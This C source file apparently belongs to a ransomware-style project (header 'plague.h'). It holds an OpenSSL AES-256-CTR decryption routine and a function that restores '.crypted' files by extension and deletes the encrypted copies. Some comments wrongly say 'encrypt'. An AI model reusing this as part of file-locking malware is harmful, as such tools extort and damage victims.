
#include "includes/plague.h"


int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create and initialise the context.
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleError();

    // Initialise the decryption operation with 256 key size and 128 bits IV size.
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv))
        handleError();

    // Provide the message to be decrypted, and obtain the plaintext output.
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleError();
    plaintext_len = len;

    // Finalise the decryption.
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleError();
    plaintext_len += len;

    // Free.
    EVP_CIPHER_CTX_free(ctx);
    return plaintext_len;
}

void decrypt_file(unsigned char key[], unsigned char iv[], const char *path)
{
    unsigned char encrypted_text[128];
    unsigned char decrypted_text[128];
    char *decrypted_filename;
    unsigned int size;
    char *substring;
    int index;
    FILE *fd, *decrypted_fd;

    if (check_ext(path) == 0)   // If extension is not in list --> dont encrypt.
        return;
    if (!(fd = fopen(path, "rb")))
        handleError();
    substring = strstr(path, ".crypted");
    if (!substring)
        return;
    index = substring - path;
    decrypted_filename = strndup(path, index);
    if (!(decrypted_fd = fopen(decrypted_filename, "w")))
        handleError();
    while ((size = fread(encrypted_text, 1, sizeof(encrypted_text), fd)) > 0)
    {
        decrypt(encrypted_text, (int)size, key, iv, decrypted_text); // Encrypt the text
        fwrite(decrypted_text, 1, size, decrypted_fd);
    }
    fclose(decrypted_fd);
    fclose(fd);
    free(decrypted_filename);
    remove(path);
}